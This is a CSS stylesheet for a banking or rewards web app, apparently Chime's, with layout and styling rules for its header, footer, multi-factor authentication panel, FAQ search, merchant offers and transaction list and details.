                #header.signed-out > .container-fluid .navbar-collapse.in .sign-in-form-container {
                    margin: -2px 2px 0;
                    background: rgba(102, 102, 102, 0.1);
                }
            }
            #header.signed-out .navbar-collapse {
                border: none;
            }
            #header.signed-out .navbar-collapse.in {
                background: none;
            }
            #content-container {
                background: transparent;
                padding-bottom: 226px;
                min-height: 100%;
                height: auto !important;
            }
            #content-container.simple {
                padding-bottom: 0;
                min-height: 0;
            }
            @media (max-width: 768px) {
                #content-container {
                    padding-bottom: 50px;
                }
            }
            #ajax-loading-screen {
                background: #fff;
                height: 100%;
                overflow: hidden;
                position: fixed;
                width: 100%;
                z-index: 2000;
                top: 0;
                left: 0;
            }
            #notification-bar {
                position: fixed;
                left: 50%;
                top: 10%;
                -ms-transform: translate(-50%, -50%);
                -webkit-transform: translate(-50%, -50%);
                transform: translate(-50%, -50%);
                z-index: 100;
                text-align: center;
            }
            @media (max-width: 767px) {
                #notification-bar {
                    top: 12% !important;
                    width: 92% !important;
                }
            }
            #notification-bar ul {
                margin: 0;
                padding: 0;
            }
            #notification-bar ul li {
                padding: 5px 0;
                font-size: 13px;
                list-style: none;
            }
            #notification-bar ul li:first-child {
                padding-top: 0;
            }
            #notification-bar ul li:last-child {
                padding-bottom: 0;
            }
            #notification-bar .alert {
                display: inline-block;
            }
            #notification-bar .alert .close {
                top: auto;
            }
            #footer {
                margin-top: -227px;
                min-height: 190px;
                background: #fafafa;
                font-size: 16px;
                color: #333;
                padding-bottom: 30px;
                position: relative;
                clear: both;
            }
            @media (max-width: 767px) {
                #footer {
                    margin-top: 0;
                    min-height: 0;
                }
            }
            #footer h3 {
                font-size: 18px;
            }
            #footer .footer-links {
                padding-bottom: 15px;
            }
            #footer .fine-print {
                color: #666666;
                text-decoration: none;
            }
            #footer li {
                padding: 5px;
                min-width: 160px;
            }
            #footer li.help-link {
                text-transform: lowercase;
                color: #666;
            }
            #footer li a {
                color: #333;
            }
            #footer li a .iconify {
                text-decoration: none;
                line-height: 36px;
                font-size: 36px;
                margin-right: 5px;
            }
            #footer li a .app-store-icon {
                opacity: 0.4;
            }
            #footer li a:hover {
                color: #1ec677;
                text-decoration: none;
            }
            #footer li a:hover .app-store-icon {
                opacity: 0.7;
            }
            @media (max-width: 767px) {
                #footer li {
                    text-align: center;
                }
            }
            #footer .social a:hover,
            #footer .social a:active {
                color: #1ec677;
                text-decoration: none;
            }
            #footer .social-widgets {
                min-width: 160px;
                padding-top: 20px;
            }
            #footer .social-widgets li {
                display: inline;
                min-width: initial;
                padding-right: 18px;
                padding-top: 20px;
            }
            #footer .social-widgets li a {
                color: #d8d8d8;
            }
            #footer .social-widgets li a:hover {
                color: #1ec677;
                text-decoration: none;
            }
            @media (max-width: 767px) {
                #footer .social-widgets {
                    text-align: center;
                }
                #footer .social-widgets ul {
                    padding-left: 12px;
                }
            }
            #footer .navbar-toggle {
                border: 1px solid #666666;
            }
            #footer .navbar-toggle .icon-bar {
                background: #666666;
            }
            #footer.simple {
                background: transparent;
                border: none;
                padding-top: 60px;
                margin-top: 0;
                height: auto;
                color: #666666;
            }
            .parsley-errors-list {
                list-style: none;
                display: block;
                margin: 2px 0;
                padding: 0;
            }
            .parsley-errors-list li {
                padding: 5px !important;
                background: rgba(238, 145, 110, 0.1);
                font-size: 12px;
                color: #ee916e;
                display: none;
            }
            .parsley-errors-list li:first-child {
                display: block;
            }
            #account-agreement .lead {
                font-size: 17px;
                font-weight: 400;
                color: #666;
                margin-bottom: 10px;
            }
            #account-agreement th,
            #account-agreement strong {
                font-weight: 400;
            }
            #account-agreement th,
            #account-agreement td {
                vertical-align: middle;
            }
            #mobile-banner {
                font-family: "Roboto", "Source Sans Pro", sans-serif;
                background: #f1f1f1;
                border-bottom: 1px solid #888;
                height: 80px;
                z-index: 100;
            }
            #mobile-banner .store-button {
                -webkit-border-radius: 3px;
                -moz-border-radius: 3px;
                -ms-border-radius: 3px;
                -o-border-radius: 3px;
                border-radius: 3px;
                background: #b3c537;
                color: #fff;
                padding: 2px 8px;
                border: none;
                margin-top: 25px;
                font-size: 14px;
            }
            #mobile-banner .dismiss-banner {
                font-size: 21px;
                line-height: 79px;
                width: 100%;
                border: 0;
                background: transparent;
                padding: 0;
                outline: 0;
            }
            #mobile-banner .app-info {
                display: inline-block;
                line-height: 1.1;
                padding: 12px 0;
            }
            #mobile-banner .app-info span {
                font-size: 13px;
            }
            #mobile-banner .app-info .store-info {
                padding-top: 8px;
                display: inline-block;
            }
            #mobile-banner .app-icon {
                display: inline-block;
                vertical-align: top;
                margin: 10px 5px 10px 0;
            }
            .twitter-typeahead {
                display: block !important;
                position: relative !important;
                height: 49px;
            }
            .twitter-typeahead .tt-query,
            .twitter-typeahead .tt-hint {
                height: 46px;
                padding: 10px 14px;
                font-size: 16px;
                line-height: 30px;
                border: 2px solid #ccc;
                outline: none;
            }
            .twitter-typeahead .tt-query {
                -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
                box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
            }
            .twitter-typeahead .tt-hint {
                color: #888;
                border: 2px solid rgba(255, 255, 255, 0);
                left: -1px !important;
            }
            .twitter-typeahead .tt-input,
            .twitter-typeahead .tt-hint {
                width: 100% !important;
                position: absolute !important;
                margin: 0 !important;
            }
            .twitter-typeahead .tt-dropdown-menu {
                width: 100%;
                margin-top: 8px;
                padding: 0;
                background-color: #fff;
                border: 1px solid rgba(0, 0, 0, 0.2);
                -webkit-box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
                box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
                -webkit-border-radius: 5px;
                -moz-border-radius: 5px;
                -ms-border-radius: 5px;
                -o-border-radius: 5px;
                border-radius: 5px;
            }
            .twitter-typeahead .tt-dropdown-menu .tt-dataset-name {
                cursor: pointer;
            }
            .twitter-typeahead .tt-suggestion,
            .twitter-typeahead .empty-message {
                padding: 5px 20px;
                font-size: 16px;
                line-height: 24px;
                border-bottom: 1px solid rgba(102, 102, 102, 0.3);
            }
            .twitter-typeahead .tt-suggestion:last-child,
            .twitter-typeahead .empty-message:last-child {
                border: none;
            }
            .twitter-typeahead .tt-suggestion.tt-cursor,
            .twitter-typeahead .tt-suggestion.tt-is-under-cursor,
            .twitter-typeahead .empty-message.tt-cursor,
            .twitter-typeahead .empty-message.tt-is-under-cursor {
                background-color: #f5f5f5;
                cursor: pointer;
            }
            .twitter-typeahead .tt-suggestion img.icon,
            .twitter-typeahead .empty-message img.icon {
                width: 25px;
                height: 25px;
                margin-top: 12px;
                -webkit-filter: grayscale(1);
                -webkit-filter: grayscale(100%);
                filter: gray;
                filter: grayscale(100%);
                opacity: 0.3;
            }
            .twitter-typeahead .tt-suggestion p,
            .twitter-typeahead .empty-message p {
                margin: 0;
                padding: 5px 0;
                line-height: 1.2;
                white-space: nowrap;
                overflow: hidden;
                text-overflow: ellipsis;
            }
            .twitter-typeahead .tt-suggestion p strong,
            .twitter-typeahead .empty-message p strong {
                font-weight: 300;
            }
            .twitter-typeahead .tt-suggestion p .text-muted,
            .twitter-typeahead .empty-message p .text-muted {
                font-size: 12px;
            }
            #content-container .section {
                padding: 30px;
            }
            #content-container .section:nth-child(odd) {
                border-top: 1px solid rgba(102, 102, 102, 0.2);
                background: #fafafa;
                border-bottom: 1px solid rgba(102, 102, 102, 0.2);
            }
            #content-container .signup-btn {
                height: 46px;
                line-height: 29px;
            }
            #content-container .signup-btn .icon-next {
                background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz48c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkxheWVyXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4IiB2aWV3Qm94PSIwIDAgMzAgMzAiIHN0eWxlPSJlbmFibGUtYmFja2dyb3VuZDpuZXcgMCAwIDMwIDMwOyIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+PHN0eWxlIHR5cGU9InRleHQvY3NzIj4uc3Qwe2ZpbGw6I0ZGRkZGRjt9PC9zdHlsZT48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgwLC0xMDM2LjM2MjIpIj48cGF0aCBjbGFzcz0ic3QwIiBkPSJNOS43LDEwMzguNGMtMi4yLDAuMi0zLjEsMy0xLjQsNC41bDguNSw4LjVsLTguNSw4LjNjLTMsMi4zLDEuMSw2LjYsMy41LDMuN2wxMC4zLTEwLjNjMS0xLDEtMi43LDAtMy43bC0xMC4zLTEwLjNjLTAuNS0wLjUtMS4xLTAuOC0xLjgtMC44QzkuOSwxMDM4LjQsOS44LDEwMzguNCw5LjcsMTAzOC40eiIvPjwvZz48L3N2Zz4=);
                background-repeat: no-repeat;
                background-size: contain;
                display: inline-block;
                position: relative;
                height: 20px;
                width: 20px;
                top: 5px;
            }
            #content-container ul#grid {
                list-style: none;
            }
            #content-container ul#grid li {
                text-align: center;
                display: inline-block;
                width: 33%;
            }
            @media (max-width: 992px) {
                #content-container ul#grid li {
                    width: 48%;
                }
            }
            .merchant-info {
                font-weight: 300;
                position: relative;
            }
            .merchant-info .row.equal [class*="col-"] {
                margin-bottom: -99999px;
                padding-bottom: 99999px;
            }
            .merchant-info .row.equal {
                overflow: hidden;
            }
            .merchant-info .details {
                background: #efefef;
            }
            .merchant-info .details .merchant-image {
                width: 100%;
            }
            .merchant-info .details .description {
                padding-top: 15px;
                padding-bottom: 15px;
                background: #87dbea;
                color: #fff;
            }
            .merchant-info .details .info {
                background: #fff;
                padding-top: 10px;
                padding-bottom: 10px;
            }
            .merchant-info .details .info .ratings-indicator {
                top: 6px;
            }
            .merchant-info .cta-section {
                background: #fafafa;
            }
            .merchant-info .cta-section .close {
                background: #666666;
                -webkit-border-radius: 11px;
                -moz-border-radius: 11px;
                -ms-border-radius: 11px;
                -o-border-radius: 11px;
                border-radius: 11px;
                padding: 1px 6px;
                position: absolute;
                right: 10px;
                top: 12px;
            }
            .merchant-info.active .description,
            .merchant-info.approved .description {
                background: #1ec677;
            }
            .merchant-info.active .offer-tag-bg,
            .merchant-info.approved .offer-tag-bg {
                position: absolute;
                width: 0;
                height: 0;
                border-style: solid;
                border-width: 115px 115px 0 0;
                border-color: #1ec677 transparent transparent transparent;
                z-index: 1;
            }
            .merchant-info.active .offer-tag,
            .merchant-info.approved .offer-tag {
                color: #fff;
                margin: 0;
                position: absolute;
                left: 10px;
                top: -5px;
                z-index: 2;
                line-height: 1;
            }
            .merchant-info.active .offer-tag small,
            .merchant-info.approved .offer-tag small {
                color: #fff;
            }
            .merchant-info.active .offer-tag span,
            .merchant-info.approved .offer-tag span {
                display: block;
            }
            .merchant-info.expired .description {
                background: #efefef;
                color: #666;
            }
            .merchant-info.expired .offer-tag {
                background: rgba(255, 255, 255, 0.2);
                color: #fff;
                text-transform: uppercase;
                position: absolute;
                left: 0;
                top: 10px;
                padding: 5px;
            }
            .merchant-info .share-bar {
                padding-top: 20px;
                padding-bottom: 10px;
            }
            .merchant-info .share-bar li {
                padding: 0;
            }
            .merchant-info .share-bar a {
                text-decoration: none;
            }
            .merchant-info .share-bar a .iconify {
                color: #666666;
                line-height: 32px;
            }
            .merchant-info .share-bar a:hover .iconify {
                color: #333333;
            }
            #invite-friends.modal-dialog .modal-content {
                background: #1ec677;
            }
            #invite-friends.modal-dialog .modal-content .modal-header {
                border: none;
            }
            #invite-friends.modal-dialog .modal-content .modal-header .close {
                position: absolute;
                top: 10px;
                right: 10px;
                background: #ffffff;
                -webkit-border-radius: 18px;
                -moz-border-radius: 18px;
                -ms-border-radius: 18px;
                -o-border-radius: 18px;
                border-radius: 18px;
                height: 35px;
                width: 35px;
                margin: 0;
                padding: 0;
                z-index: 9999;
            }
            #invite-friends.modal-dialog .modal-content .modal-body.invert-text h1,
            #invite-friends.modal-dialog .modal-content .modal-body.invert-text p {
                color: #fff !important;
            }
            #invite-friends.modal-dialog .modal-content .modal-body span.small {
                display: block;
                margin: 0 0 3px 3px;
                font-size: 11px;
            }
            #invite-friends.modal-dialog .modal-content .modal-body .popover {
                max-height: 300px;
                overflow-y: scroll;
            }
            #invite-friends.modal-dialog .modal-content .modal-body .popover-content {
                color: #666666;
                font-weight: 300;
                font-size: 13px;
            }
            #invite-friends.modal-dialog .modal-content .modal-body .btn.btn-link {
                margin: -3px 0 0 0;
                padding: 0;
                min-width: 0;
                color: rgba(255, 255, 255, 0.9);
                line-height: 36px;
                height: 10px;
            }
            #invite-friends.modal-dialog .modal-content .modal-body .btn.btn-link .iconify {
                font-size: 16px;
                line-height: 16px;
                font-weight: 300;
            }
            #invite-friends.modal-dialog .modal-content .modal-body .btn.btn-link:hover,
            #invite-friends.modal-dialog .modal-content .modal-body .btn.btn-link:active,
            #invite-friends.modal-dialog .modal-content .modal-body .btn.btn-link:visited,
            #invite-friends.modal-dialog .modal-content .modal-body .btn.btn-link:focus {
                text-decoration: none;
            }
            #invite-friends.modal-dialog .modal-content .modal-body .btn.btn-link:hover:hover,
            #invite-friends.modal-dialog .modal-content .modal-body .btn.btn-link:active:hover,
            #invite-friends.modal-dialog .modal-content .modal-body .btn.btn-link:visited:hover,
            #invite-friends.modal-dialog .modal-content .modal-body .btn.btn-link:focus:hover {
                color: white;
            }
            #invite-friends.modal-dialog .modal-content .modal-body.link-section {
                background: #fff;
                border-bottom-right-radius: 6px;
                border-bottom-left-radius: 6px;
            }
            #invite-friends.modal-dialog .modal-content .modal-body.link-section .social-widgets li {
                display: inline-block;
                min-width: initial;
                padding-right: 18px;
                padding-top: 20px;
            }
            #invite-friends.modal-dialog .modal-content .modal-body.link-section .social-widgets li a {
                color: #d8d8d8;
            }
            #invite-friends.modal-dialog .modal-content .modal-body.link-section .social-widgets li a:hover {
                color: #1ec677;
                text-decoration: none;
            }
            #invite-friends.modal-dialog .modal-content .modal-body.link-section .social-widgets li:first-child {
                padding-right: 20px;
            }
            #invite-friends.modal-dialog .modal-content .modal-body.link-section .social-widgets li:nth-child(2) {
                padding-right: 16px;
            }
            #application.multi_factor_auth {
                background: rgba(102, 102, 102, 0.15);
            }
            @media (max-width: 767px) {
                #application.multi_factor_auth .vertical-spacer2:nth-of-type(1) {
                    height: 15px;
                }
            }
            #application.multi_factor_auth .fine-print {
                color: rgba(102, 102, 102, 0.9);
            }
            #application.multi_factor_auth #chime_logo {
                width: 80px !important;
            }
            #application.multi_factor_auth #progress-bar {
                border-left: 1px solid rgba(102, 102, 102, 0.35);
                border-right: 1px solid rgba(102, 102, 102, 0.35);
                background: #e7e7e7;
                height: 2px;
                max-width: 480px;
            }
            #application.multi_factor_auth #progress-bar .progress-made {
                background: #1ec677;
                height: 2px;
                width: 0;
            }
            @media (max-width: 767px) {
                #application.multi_factor_auth #progress-bar {
                    margin-top: 2px;
                }
            }
            #auth-panel {
                border: 1px solid rgba(102, 102, 102, 0.35);
                background: #fff;
                padding: 15px;
                max-width: 480px;
            }
            #auth-panel .form-control {
                margin-bottom: 10px;
            }
            #auth-panel .info-section {
                padding-bottom: 10px;
            }
            #auth-panel .info-section .iconify {
                color: #e3e3e3;
                font-size: 74px;
            }
            #auth-panel .info-section .img-responsive {
                margin-top: 8px;
            }
            #auth-panel .info-section p {
                color: #666;
            }
            #auth-panel .info-section h4 {
                text-align: center;
                margin-top: 31.68px;
                font-size: 21px;
                color: #000;
            }
            @media (max-width: 767px) {
                #auth-panel .info-section .iconify {
                    font-size: 54px;
                }
                #auth-panel .info-section h3 {
                    text-align: center;
                    margin-top: 0;
                }
                #auth-panel .info-section p {
                    text-align: center;
                }
            }
            @media (min-width: 768px) {
                #auth-panel .col-sm-6:nth-of-type(1) {
                    padding-right: 5px;
                }
                #auth-panel .col-sm-6:nth-of-type(2) {
                    padding-left: 5px;
                }
                #auth-panel .col-sm-9 {
                    padding-left: 5px;
                }
            }
            #auth-panel .parsley-errors-list {
                position: relative;
                top: -10px;
            }
            #auth-panel .form-control-feedback .iconify {
                color: #666;
                font-size: 26px;
            }
            #auth-panel label {
                text-transform: none;
                font-size: 16px;
                font-weight: 450;
                color: #000;
            }
            #auth-panel .action_links {
                font-style: normal;
                font-weight: 700;
                font-size: 16px;
                line-height: 22px;
                color: #1ec677;
            }
            #auth-panel #options-panels .panel {
                margin-top: 1px;
            }
            #auth-panel #options-panels .panel .panel-heading {
                padding: 5px 10px;
            }
            #auth-panel #options-panels .panel .panel-heading a {
                font-size: 13px;
                text-decoration: none;
                color: #666;
                border-bottom: 1px solid transparent;
            }
            #auth-panel #options-panels .panel .panel-heading a:hover {
                border-bottom: 1px dotted rgba(102, 102, 102, 0.35);
            }
            #auth-panel #options-panels .panel .panel-body {
                background: rgba(102, 102, 102, 0.05);
            }
            #auth-panel #options-panels .btn {
                margin-top: 10px;
            }
            .hero-image {
                margin: 25px 0;
            }
            .explainer-content {
                padding: 0 10px;
                margin-bottom: 25px;
            }
            .emoji-list {
                list-style: none;
                padding: 0;
                margin: 0;
            }
            .emoji-list li {
                padding-left: 1rem;
                text-indent: -0.7rem;
            }
            .emoji-list li:nth-child(1)::before {
                content: "📷 ";
            }
            .emoji-list li:nth-child(2)::before {
                content: "🤳 ";
            }
            .emoji-list li:nth-child(3)::before {
                content: "🏆 ";
            }
            .card-input {
                font-size: 80%;
            }
            #faqs-page #quicksearch-field,
            #category-faqs #quicksearch-field {
                border: 1px solid #eaeaea;
                position: relative;
                -webkit-border-radius: 5px;
                -moz-border-radius: 5px;
                -ms-border-radius: 5px;
                -o-border-radius: 5px;
                border-radius: 5px;
                margin-bottom: 2px;
            }
            #faqs-page #quicksearch-field .iconify,
            #category-faqs #quicksearch-field .iconify {
                font-size: 25px;
                color: #666666;
            }
            #faqs-page #quicksearch-field .search-icon,
            #category-faqs #quicksearch-field .search-icon {
                position: absolute;
                top: -2px;
                left: 5px;
                z-index: 2;
            }
            @media (max-width: 767px) {
                #faqs-page #quicksearch-field #faq-search-input,
                #category-faqs #quicksearch-field #faq-search-input {
                    min-width: 150px;
                }
            }
            #faqs-page #faq-search-input,
            #faqs-page .twitter-typeahead .tt-hint,
            #category-faqs #faq-search-input,
            #category-faqs .twitter-typeahead .tt-hint {
                border: none;
                font-size: 16px;
                z-index: 1;
                height: 34px;
                line-height: 34px;
                width: 100%;
                -webkit-border-radius: 5px;
                -moz-border-radius: 5px;
                -ms-border-radius: 5px;
                -o-border-radius: 5px;
                border-radius: 5px;
                margin: 0;
                padding: 2px 4px 2px 35px;
            }
            #faqs-page .twitter-typeahead,
            #category-faqs .twitter-typeahead {
                height: 35px;
                right: -1px;
            }
            #faqs-page #faq-search-input,
            #category-faqs #faq-search-input {
                left: -1px;
            }
            #faqs-article #faq-title-link {
                position: relative;
            }
            #faqs-article #faq-title-link a {
                color: black;
            }
            #faqs-article #faq-title-link a:hover {
                text-decoration: none;
            }
            #faqs-article #faq-title-link a p {
                padding-left: 24px;
            }
            #faqs-article #faq-title-link a .iconify {
                position: absolute;
                font-size: 34px;
                top: -5px;
                margin-left: -5px;
                line-height: 35px;
            }
            #faqs-article .article-body {
                padding: 16px 20px;
                background-color: #f9f9f9;
            }
            #faqs-article .article-body strong {
                font-weight: normal;
                color: black;
            }
            #faqs-article ul.support-cta-btns li a {
                min-width: 180px;
            }
            #faqs-article ul.support-cta-btns li a:hover {
                text-decoration: none;
            }
            #faqs-article ul.support-cta-btns li:first-child {
                margin-bottom: 12px;
            }
            #faqs-article #related-faqs #related-list li {
                padding: 10px 0;
                line-height: 1.4;
            }
            .login-carousel #lp-carousel {
                max-width: 400px;
                margin: 0 auto 35px;
            }
            .login-carousel #lp-carousel .carousel-slide img {
                margin: 0 auto;
            }
            .login-carousel #lp-carousel .carousel-slide p {
                text-align: center;
                margin-top: 13px;
            }
            .login-carousel #lp-carousel .slick-dots {
                bottom: -38px !important;
            }
            .login-carousel #lp-carousel .slick-dots li {
                margin: 0;
            }
            .login-carousel #lp-carousel .slick-dots li button:before {
                font-size: 9px;
            }
            .transactions-page {
                min-height: 850px;
            }
            .transactions-page #transaction-list-view .usr-transactions {
                margin-bottom: 0;
            }
            .transactions-page #transaction-list-view .usr-transactions li {
                cursor: pointer;
                border-bottom: 1px solid #eaeaea;
                line-height: 1.2;
                background: #fff;
            }
            .transactions-page #transaction-list-view .usr-transactions li.list-header {
                color: #666666;
                font-size: 13px;
                text-transform: uppercase;
                font-weight: 400;
                padding: 4px 10px;
                background: #f9f9f9;
            }
            .transactions-page #transaction-list-view .usr-transactions li .media-list:hover {
                background: rgba(255, 232, 64, 0.1);
                -webkit-transition: all 0.5s ease-in-out;
                -o-transition: all 0.5s ease-in-out;
                transition: all 0.5s ease-in-out;
            }
            .transactions-page #transaction-list-view .usr-transactions li .media {
                display: block;
                text-decoration: none;
            }
            .transactions-page #transaction-list-view .usr-transactions li .media .inner-wrap {
                padding: 9px 0;
                position: relative;
                table-layout: fixed;
                display: table;
                width: 100%;
            }
            .transactions-page #transaction-list-view .usr-transactions li .media .inner-wrap h3 {
                margin: 0;
                padding: 0 10px;
                line-height: 1.2;
                font-size: 20px;
            }
            .transactions-page #transaction-list-view .usr-transactions li .media .inner-wrap h3 small {
                color: #666666;
                border-bottom: 1px dotted rgba(102, 102, 102, 0.4);
                padding: 2px;
                margin: 0 2px;
                display: inline-block;
            }
            .transactions-page #transaction-list-view .usr-transactions li .media .inner-wrap .rewards {
                color: #1ec677;
                display: block;
            }
            .transactions-page #transaction-list-view .usr-transactions li .media .inner-wrap .txn-time {
                font-size: 12px;
                margin: 0;
                padding: 5px 10px 0;
                color: #666;
            }
            .transactions-page #transaction-list-view .usr-transactions li .media .inner-wrap .tags {
                position: absolute;
                font-size: 12px;
                font-weight: normal;
                right: 10px;
                top: 25%;
                margin: 0;
            }
            .transactions-page #transaction-list-view .usr-transactions li .media.pending h3 {
                color: rgba(51, 51, 51, 0.6);
            }
            .transactions-page #transaction-list-view .usr-transactions li .media.pending .txn-time {
                color: rgba(102, 102, 102, 0.8);
            }
            .transactions-page #transaction-list-view .usr-transactions li .media .media-body {
                position: relative;
            }
            @media (max-width: 480px) {
                .transactions-page #transaction-list-view .usr-transactions li .media .media-body h3 {
                    font-size: 20px;
                    padding-right: 0;
                }
            }
            .transactions-page #transaction-list-view .usr-transactions li .media .media-body .label {
                margin-top: 8px;
                display: inline-block;
            }
            .transactions-page #transaction-list-view .usr-transactions li .media .media-right {
                padding-left: 0;
                border-left: 1px solid #eaeaea;
                min-width: 120px;
            }
            @media (max-width: 480px) {
                .transactions-page #transaction-list-view .usr-transactions li .media .media-right {
                    min-width: 90px;
                }
                .transactions-page #transaction-list-view .usr-transactions li .media .media-right h3 {
                    font-size: 20px;
                    padding-left: 0;
                }
            }
            .transactions-page #transaction-list-view .usr-transactions li.active {
                background: rgba(255, 232, 64, 0.15);
                -webkit-transition: all 0.5s ease-in-out;
                -o-transition: all 0.5s ease-in-out;
                transition: all 0.5s ease-in-out;
            }
            .transactions-page #transaction-list-view .usr-transactions li.active .media.pending {
                background: transparent;
            }
            .transactions-page .txn-header-wrapper {
                border-bottom: 1px solid #eaeaea;
            }
            .transactions-page .txn.ng-move,
            .transactions-page .txn.ng-enter,
            .transactions-page .txn.ng-leave {
                -webkit-transition: all linear 0.3s;
                -o-transition: all linear 0.3s;
                transition: all linear 0.3s;
            }
            .transactions-page .txn.ng-leave.ng-leave-active,
            .transactions-page .txn.ng-move,
            .transactions-page .txn.ng-enter {
                opacity: 0;
            }
            .transactions-page .txn.ng-leave,
            .transactions-page .txn.ng-move.ng-move-active,
            .transactions-page .txn.ng-enter.ng-enter-active {
                opacity: 1;
            }
            .transactions-page #transaction-details-view {
                position: absolute;
                right: 15px;
                z-index: 2;
            }
            @media (max-width: 768px) {
                .transactions-page #transaction-details-view {
                    right: 0;
                }
            }
            .transactions-page #transaction-details-view #transaction-details {
                background: #fff;
                border: 1px solid #e1e1e1;
                margin-top: 15px;
                padding: 5px 10px 15px;
                position: relative;
                -webkit-border-radius: 5px;
                -moz-border-radius: 5px;
                -ms-border-radius: 5px;
                -o-border-radius: 5px;
                border-radius: 5px;
            }
            @media (max-width: 767px) {
                .transactions-page #transaction-details-view #transaction-details {
                    margin: -2px 0 0;
                }
            }
            .transactions-page #transaction-details-view #transaction-details .dismiss-details {
                height: 30px;
                width: 30px;
            }
            .transactions-page #transaction-details-view #transaction-details hr {
                width: 30%;
                margin-top: 0;
                margin-bottom: 6px;
            }
            .transactions-page #transaction-details-view #transaction-details .vertical-spacer1 {
                height: 15px;
            }
            .transactions-page #transaction-details-view #transaction-details .rewards {
                color: #1ec677;
            }
            .transactions-page #transaction-details-view #transaction-details .editable {
                cursor: pointer;
            }
            .transactions-page #transaction-details-view #transaction-details .txn-icon {
                margin: 15px auto;
                color: #fff;
                padding: 10px;
                height: 50px;
                width: 50px;
                display: inline-block;
                line-height: 33px;
                -webkit-border-radius: 25px;
                -moz-border-radius: 25px;
                -ms-border-radius: 25px;
                -o-border-radius: 25px;
                border-radius: 25px;
                text-decoration: none;
            }
            .transactions-page #transaction-details-view #transaction-details .txn-line {
                border-bottom: 3px dotted #eeeeee;
            }
            @media print {
                .transactions-page #transaction-details-view #transaction-details .txn-line {
                    border-bottom: none;
                }
            }
            .transactions-page #transaction-details-view #transaction-details .txn-line h3 {
                margin-top: 10px;
                margin-bottom: -10px;
                background: #fff;
                padding: 2px 10px;
            }
            .transactions-page #transaction-details-view #transaction-details .txn-line:last-child {
                margin-bottom: 10px;
            }
            .transactions-page #transaction-details-view #transaction-details a.dispute-link {
                color: #666666;
                font-size: 11px;
                font-weight: 400;
                display: inline-block;
            }
            .transactions-page #transaction-details-view #transaction-details a.dispute-link:hover {
                color: #333333;
            }
            .transactions-page #transaction-details-view #transaction-details .label-panel {
                padding: 10px 0;
            }
            .transactions-page #transaction-details-view #transaction-details .label-panel .label {
                display: inline-block;
                margin-right: 5px;
            }
            .transactions-page #transaction-details-view #transaction-details .label-panel .label.label-success:hover {
                background: #1ec677;
                color: #fff;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel {
                /*!
 * bootstrap-tokenfield
 * https://github.com/sliptree/bootstrap-tokenfield
 * Copyright 2013-2014 Sliptree and other contributors; Licensed MIT
 */
            }
            @-webkit-keyframes blink {
                0% {
                    border-color: #ededed;
                }
                100% {
                    border-color: #b94a48;
                }
            }
            @-moz-keyframes blink {
                0% {
                    border-color: #ededed;
                }
                100% {
                    border-color: #b94a48;
                }
            }
            @keyframes blink {
                0% {
                    border-color: #ededed;
                }
                100% {
                    border-color: #b94a48;
                }
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .tokenfield {
                height: auto;
                min-height: 34px;
                padding-bottom: 0px;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .tokenfield.focus {
                border-color: #66afe9;
                outline: 0;
                -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(102, 175, 233, 0.6);
                box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(102, 175, 233, 0.6);
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .tokenfield .token {
                -webkit-box-sizing: border-box;
                -moz-box-sizing: border-box;
                box-sizing: border-box;
                -webkit-border-radius: 3px;
                -moz-border-radius: 3px;
                border-radius: 3px;
                display: inline-block;
                border: 1px solid #d9d9d9;
                background-color: #ededed;
                white-space: nowrap;
                margin: -1px 5px 5px 0;
                height: 22px;
                vertical-align: top;
                cursor: default;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .tokenfield .token:hover {
                border-color: #b9b9b9;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .tokenfield .token.active {
                border-color: #52a8ec;
                border-color: rgba(82, 168, 236, 0.8);
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .tokenfield .token.duplicate {
                border-color: #ebccd1;
                -webkit-animation-name: blink;
                animation-name: blink;
                -webkit-animation-duration: 0.1s;
                animation-duration: 0.1s;
                -webkit-animation-direction: normal;
                animation-direction: normal;
                -webkit-animation-timing-function: ease;
                animation-timing-function: ease;
                -webkit-animation-iteration-count: infinite;
                animation-iteration-count: infinite;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .tokenfield .token.invalid {
                background: none;
                border: 1px solid transparent;
                -webkit-border-radius: 0;
                -moz-border-radius: 0;
                border-radius: 0;
                border-bottom: 1px dotted #d9534f;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .tokenfield .token.invalid.active {
                background: #ededed;
                border: 1px solid #ededed;
                -webkit-border-radius: 3px;
                -moz-border-radius: 3px;
                border-radius: 3px;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .tokenfield .token .token-label {
                display: inline-block;
                overflow: hidden;
                text-overflow: ellipsis;
                padding-left: 4px;
                vertical-align: top;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .tokenfield .token .close {
                font-family: Arial;
                display: inline-block;
                line-height: 100%;
                font-size: 1.1em;
                line-height: 1.49em;
                margin-left: 5px;
                float: none;
                height: 100%;
                vertical-align: top;
                padding-right: 4px;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .tokenfield .token-input {
                background: none;
                width: 60px;
                min-width: 60px;
                border: 0;
                height: 20px;
                padding: 0;
                margin-bottom: 6px;
                -webkit-box-shadow: none;
                box-shadow: none;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .tokenfield .token-input:focus {
                border-color: transparent;
                outline: 0;
                -webkit-box-shadow: none;
                box-shadow: none;
            }
